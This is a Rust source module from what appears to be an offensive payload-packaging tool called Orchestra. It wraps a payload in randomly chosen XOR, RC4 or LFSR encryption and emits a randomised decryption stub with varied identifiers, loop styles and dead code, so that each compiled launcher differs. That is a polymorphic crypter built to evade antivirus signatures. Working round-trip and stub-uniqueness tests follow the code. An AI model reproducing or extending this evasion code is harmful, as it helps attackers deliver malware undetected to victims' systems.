//! Polymorphic payload wrapper for Orchestra's payload-packager.
//!
//! Each call to [`poly_wrap`] randomly selects one of three stream-cipher
//! schemes, generates a fresh key, and encrypts the payload.  The companion
//! [`poly_emit_stub`] function outputs a *structurally unique* Rust source
//! file for the decryption stub: variable names, loop forms, and dead-code
//! blocks are all randomised so each invocation produces a different binary
//! when the stub is compiled into the launcher.
//!
//! # Wire format (`poly_serialize` output)
//!
//! ```text
//! [4 bytes: magic "POLY"]
//! [1 byte:  scheme (0 = XorStream, 1 = Rc4, 2 = LfsrStream)]
//! [4 bytes BE: key_len]
//! [key_len bytes: key]
//! [4 bytes BE: ciphertext_len]
//! [ciphertext_len bytes: ciphertext]
//! ```
//!
//! # Schemes
//!
//! | ID | Name        | Key size    | Notes                            |
//! |----|-------------|-------------|----------------------------------|
//! | 0  | XorStream   | 16–64 bytes | Repeating XOR                    |
//! | 1  | Rc4         | 16–256 bytes| Classic RC4 stream cipher        |
//! | 2  | LfsrStream  | 8 bytes     | 64-bit Galois LFSR keystream     |

use rand::Rng;

// ── Encryption scheme ─────────────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PolyScheme {
    XorStream  = 0,
    Rc4        = 1,
    LfsrStream = 2,
}

impl PolyScheme {
    fn random(rng: &mut impl Rng) -> Self {
        match rng.gen_range(0u8..3) {
            0 => Self::XorStream,
            1 => Self::Rc4,
            _ => Self::LfsrStream,
        }
    }

    fn byte(self) -> u8 {
        self as u8
    }
}

// ── Blob ──────────────────────────────────────────────────────────────────────

pub struct PolyBlob {
    pub scheme:     PolyScheme,
    pub key:        Vec<u8>,
    pub ciphertext: Vec<u8>,
}

// ── Public API ────────────────────────────────────────────────────────────────

/// Wrap `plaintext` with a randomly-chosen scheme and a fresh random key.
/// Every call produces different ciphertext even for the same input.
pub fn poly_wrap(plaintext: &[u8]) -> PolyBlob {
    let mut rng = rand::thread_rng();
    let scheme = PolyScheme::random(&mut rng);

    match scheme {
        PolyScheme::XorStream => {
            let key_len: usize = rng.gen_range(16..=64);
            let key: Vec<u8> = (0..key_len).map(|_| rng.gen()).collect();
            let ct = xor_stream(plaintext, &key);
            PolyBlob { scheme, key, ciphertext: ct }
        }
        PolyScheme::Rc4 => {
            let key_len: usize = rng.gen_range(16..=256);
            let key: Vec<u8> = (0..key_len).map(|_| rng.gen()).collect();
            let ct = rc4(plaintext, &key);
            PolyBlob { scheme, key, ciphertext: ct }
        }
        PolyScheme::LfsrStream => {
            // 8-byte seed — fed into a 64-bit Galois LFSR.
            let key: Vec<u8> = (0..8).map(|_| rng.gen()).collect();
            let ct = lfsr_stream(plaintext, &key);
            PolyBlob { scheme, key, ciphertext: ct }
        }
    }
}

/// Serialize a [`PolyBlob`] to the binary wire format documented at the top of
/// this module.
pub fn poly_serialize(blob: &PolyBlob) -> Vec<u8> {
    let mut out = Vec::with_capacity(4 + 1 + 4 + blob.key.len() + 4 + blob.ciphertext.len());
    out.extend_from_slice(b"POLY");
    out.push(blob.scheme.byte());
    out.extend_from_slice(&(blob.key.len() as u32).to_be_bytes());
    out.extend_from_slice(&blob.key);
    out.extend_from_slice(&(blob.ciphertext.len() as u32).to_be_bytes());
    out.extend_from_slice(&blob.ciphertext);
    out
}

/// Emit a unique-per-build Rust source file for the decryption stub.
///
/// The returned string is valid Rust that defines a public function:
///
/// ```rust,ignore
/// pub fn poly_decrypt(ciphertext: &[u8]) -> Vec<u8> { ... }
/// ```
///
/// The function has the key and algorithm hardcoded.  Structural elements
/// (variable names, loop style, dead-code interleavings) are randomised every
/// call so each compiled stub binary has a different binary layout.
pub fn poly_emit_stub(blob: &PolyBlob) -> String {
    let mut rng = rand::thread_rng();

    // Unique short hex token — makes every generated file visually distinct.
    let build_token: u64 = rng.gen();

    // Pre-generate all random identifiers up-front to avoid closure/borrow conflicts.
    let suf_ct   = format!("{:04x}{:04x}", rng.gen::<u16>(), rng.gen::<u16>());
    let suf_out  = format!("{:04x}{:04x}", rng.gen::<u16>(), rng.gen::<u16>());
    let suf_key  = format!("{:04x}{:04x}", rng.gen::<u16>(), rng.gen::<u16>());
    let suf_idx  = format!("{:04x}{:04x}", rng.gen::<u16>(), rng.gen::<u16>());
    let suf_klen = format!("{:04x}{:04x}", rng.gen::<u16>(), rng.gen::<u16>());
    let suf_dead = format!("{:04x}{:04x}", rng.gen::<u16>(), rng.gen::<u16>());
    let dead_val: u64 = rng.gen();

    let v_ct   = format!("ct_{suf_ct}");
    let v_out  = format!("out_{suf_out}");
    let v_key  = format!("key_{suf_key}");
    let v_idx  = format!("i_{suf_idx}");
    let v_klen = format!("kl_{suf_klen}");
    let v_dead = format!("_dead_{suf_dead}");

    let key_literal = byte_array_literal(&blob.key);

    let body = match blob.scheme {
        PolyScheme::XorStream => emit_xor_body(
            &v_ct, &v_key, &v_out, &v_idx, &v_klen, &key_literal, &mut rng,
        ),
        PolyScheme::Rc4 => emit_rc4_body(
            &v_ct, &v_key, &v_out, &key_literal, &mut rng,
        ),
        PolyScheme::LfsrStream => emit_lfsr_body(
            &v_ct, &v_key, &v_out, &v_idx, &key_literal, &mut rng,
        ),
    };

    // Vary whether dead code appears before or after the key assignment.
    let (before_dead, after_dead) = if rng.gen_bool(0.5) {
        (format!("    let {v_dead}: u64 = {dead_val}u64;\n    let _ = {v_dead};\n"),
         String::new())
    } else {
        (String::new(),
         format!("    let {v_dead}: u64 = {dead_val}u64;\n    let _ = {v_dead};\n"))
    };

    format!(
        "// poly_decrypt stub — generated by payload-packager --poly\n\
         // Build token: {build_token:016x}  scheme: {scheme:?}\n\
         #[allow(unused_variables, unused_mut, clippy::all, non_snake_case)]\n\
         pub fn poly_decrypt({v_ct}: &[u8]) -> ::std::vec::Vec<u8> {{\n\
         {before_dead}\
         {body}\
         {after_dead}\
         }}\n",
        build_token = build_token,
        scheme = blob.scheme,
    )
}

// ── Stream cipher implementations ─────────────────────────────────────────────

/// XOR plaintext with a repeating key.
fn xor_stream(data: &[u8], key: &[u8]) -> Vec<u8> {
    assert!(!key.is_empty());
    data.iter()
        .enumerate()
        .map(|(i, &b)| b ^ key[i % key.len()])
        .collect()
}

/// Classic RC4 (ARCFOUR) stream cipher.
fn rc4(data: &[u8], key: &[u8]) -> Vec<u8> {
    assert!(!key.is_empty());
    let mut s: [u8; 256] = std::array::from_fn(|i| i as u8);
    let mut j: usize = 0;
    for i in 0..256 {
        j = (j + s[i] as usize + key[i % key.len()] as usize) & 0xff;
        s.swap(i, j);
    }
    let mut i = 0usize;
    j = 0;
    data.iter()
        .map(|&b| {
            i = (i + 1) & 0xff;
            j = (j + s[i] as usize) & 0xff;
            s.swap(i, j);
            let k = s[(s[i] as usize + s[j] as usize) & 0xff];
            b ^ k
        })
        .collect()
}

/// 64-bit Galois LFSR stream cipher.
/// The 8-byte key initialises the LFSR state; the tap polynomial is
/// `x^64 + x^4 + x^3 + x + 1` (a standard maximal-length primitive).
fn lfsr_stream(data: &[u8], key: &[u8]) -> Vec<u8> {
    assert!(key.len() >= 8);
    let mut state = u64::from_le_bytes(key[..8].try_into().unwrap());
    if state == 0 { state = 0xace1_ace1_ace1_ace1; } // avoid all-zero state
    const POLY: u64 = 0x8000_0000_0000_000b; // taps at 64,4,3,1 (Galois form)
    data.iter()
        .map(|&b| {
            let bit = state & 1;
            state >>= 1;
            if bit != 0 { state ^= POLY; }
            b ^ (state as u8)
        })
        .collect()
}

// ── Stub body emitters ────────────────────────────────────────────────────────

fn emit_xor_body(
    v_ct: &str, v_key: &str, v_out: &str, v_idx: &str, v_klen: &str,
    key_lit: &str, rng: &mut impl Rng,
) -> String {
    if rng.gen_bool(0.5) {
        // Style A: indexed for-loop
        format!(
            "    let {v_key}: &[u8] = &[{key_lit}];\n    \
             let {v_klen} = {v_key}.len();\n    \
             let mut {v_out} = ::std::vec::Vec::with_capacity({v_ct}.len());\n    \
             for {v_idx} in 0..{v_ct}.len() {{\n        \
             {v_out}.push({v_ct}[{v_idx}] ^ {v_key}[{v_idx} % {v_klen}]);\n    \
             }}\n    \
             {v_out}\n",
        )
    } else {
        // Style B: iterator chain (no explicit loop variable)
        format!(
            "    let {v_key}: &[u8] = &[{key_lit}];\n    \
             {v_ct}.iter().enumerate()\n        \
             .map(|({v_idx}, &b)| b ^ {v_key}[{v_idx} % {v_key}.len()])\n        \
             .collect()\n",
        )
    }
}

fn emit_rc4_body(
    v_ct: &str, v_key: &str, v_out: &str, key_lit: &str, rng: &mut impl Rng,
) -> String {
    // Variable names for internal RC4 state
    let mut suf = || format!("{:04x}", rng.gen::<u16>());
    let vs  = format!("s_{}", suf());
    let vj  = format!("j_{}", suf());
    let vi  = format!("i_{}", suf());
    let vk  = format!("k_{}", suf());
    let vb  = format!("b_{}", suf());

    format!(
        "    let {v_key}: &[u8] = &[{key_lit}];\n    \
         let mut {vs}: [u8; 256] = ::std::array::from_fn(|i| i as u8);\n    \
         let mut {vj}: usize = 0;\n    \
         for {vi} in 0..256usize {{\n        \
         {vj} = ({vj} + {vs}[{vi}] as usize + {v_key}[{vi} % {v_key}.len()] as usize) & 0xff;\n        \
         {vs}.swap({vi}, {vj});\n    \
         }}\n    \
         let mut {vi}: usize = 0;\n    \
         {vj} = 0;\n    \
         let {v_out}: ::std::vec::Vec<u8> = {v_ct}.iter().map(|&{vb}| {{\n        \
         {vi} = ({vi} + 1) & 0xff;\n        \
         {vj} = ({vj} + {vs}[{vi}] as usize) & 0xff;\n        \
         {vs}.swap({vi}, {vj});\n        \
         let {vk} = {vs}[({vs}[{vi}] as usize + {vs}[{vj}] as usize) & 0xff];\n        \
         {vb} ^ {vk}\n    \
         }}).collect();\n    \
         {v_out}\n",
    )
}

fn emit_lfsr_body(
    v_ct: &str, v_key: &str, v_out: &str, v_idx: &str, key_lit: &str,
    rng: &mut impl Rng,
) -> String {
    let mut suf = || format!("{:04x}", rng.gen::<u16>());
    let vst = format!("st_{}", suf());
    let vbt = format!("bt_{}", suf());

    // Hardcode the polynomial constant differently each build: the value is
    // always the same but the literal is written differently.
    let poly_val: u64 = 0x8000_0000_0000_000b;
    let poly_lit = if rng.gen_bool(0.5) {
        format!("0x{:016x}u64", poly_val)
    } else {
        format!("{}u64", poly_val)
    };

    // Style A: loop with explicit index
    if rng.gen_bool(0.5) {
        format!(
            "    let {v_key}: &[u8] = &[{key_lit}];\n    \
             let mut {vst} = u64::from_le_bytes({v_key}[..8].try_into().unwrap_or([0xacu8, 0xe1, 0xac, 0xe1, 0xac, 0xe1, 0xac, 0xe1]));\n    \
             if {vst} == 0 {{ {vst} = 0xace1_ace1_ace1_ace1u64; }}\n    \
             let mut {v_out} = ::std::vec::Vec::with_capacity({v_ct}.len());\n    \
             for {v_idx} in 0..{v_ct}.len() {{\n        \
             let {vbt} = {vst} & 1;\n        \
             {vst} >>= 1;\n        \
             if {vbt} != 0 {{ {vst} ^= {poly_lit}; }}\n        \
             {v_out}.push({v_ct}[{v_idx}] ^ {vst} as u8);\n    \
             }}\n    \
             {v_out}\n",
        )
    } else {
        // Style B: fold/scan
        format!(
            "    let {v_key}: &[u8] = &[{key_lit}];\n    \
             let seed = u64::from_le_bytes({v_key}[..8].try_into().unwrap_or([0xacu8, 0xe1, 0xac, 0xe1, 0xac, 0xe1, 0xac, 0xe1]));\n    \
             let mut {vst}: u64 = if seed == 0 {{ 0xace1_ace1_ace1_ace1u64 }} else {{ seed }};\n    \
             {v_ct}.iter().map(|&{vbt}| {{\n        \
             let bit = {vst} & 1;\n        \
             {vst} >>= 1;\n        \
             if bit != 0 {{ {vst} ^= {poly_lit}; }}\n        \
             {vbt} ^ {vst} as u8\n    \
             }}).collect()\n",
        )
    }
}

// ── Helpers ───────────────────────────────────────────────────────────────────

fn byte_array_literal(bytes: &[u8]) -> String {
    bytes.iter()
        .map(|b| format!("0x{:02x}u8", b))
        .collect::<Vec<_>>()
        .join(", ")
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn xor_stream_roundtrip() {
        let pt = b"hello world, this is a test payload";
        let key = vec![0x42u8, 0xde, 0xad, 0xbe, 0xef];
        let ct = xor_stream(pt, &key);
        assert_ne!(&ct[..], &pt[..]);
        assert_eq!(&xor_stream(&ct, &key), pt);
    }

    #[test]
    fn rc4_roundtrip() {
        let pt = b"orchestra polymorphic test";
        let key = b"secret-key-bytes";
        let ct = rc4(pt, key);
        assert_ne!(&ct[..], &pt[..]);
        assert_eq!(&rc4(&ct, key), pt);
    }

    #[test]
    fn lfsr_stream_roundtrip() {
        let pt = b"lfsr stream cipher test payload!";
        let key = vec![0x01u8, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef];
        let ct = lfsr_stream(pt, &key);
        assert_ne!(&ct[..], &pt[..]);
        assert_eq!(&lfsr_stream(&ct, &key), pt);
    }

    #[test]
    fn poly_wrap_serialize_roundtrip() {
        let pt = b"full poly wrap test";
        let blob = poly_wrap(pt);
        let serialized = poly_serialize(&blob);
        assert_eq!(&serialized[..4], b"POLY");
    }

    #[test]
    fn poly_emit_stub_is_unique() {
        let blob = poly_wrap(b"variation test");
        let stub_a = poly_emit_stub(&blob);
        let stub_b = poly_emit_stub(&blob);
        // Two stubs for the same blob should differ (different variable names + build token).
        assert_ne!(stub_a, stub_b);
    }

    #[test]
    fn stub_contains_key_bytes() {
        let pt = b"stub key test";
        let blob = poly_wrap(pt);
        let stub = poly_emit_stub(&blob);
        // Every key byte should appear as a hex literal somewhere in the stub.
        for byte in &blob.key {
            assert!(
                stub.contains(&format!("0x{:02x}u8", byte)),
                "stub missing key byte 0x{:02x}",
                byte
            );
        }
    }
}
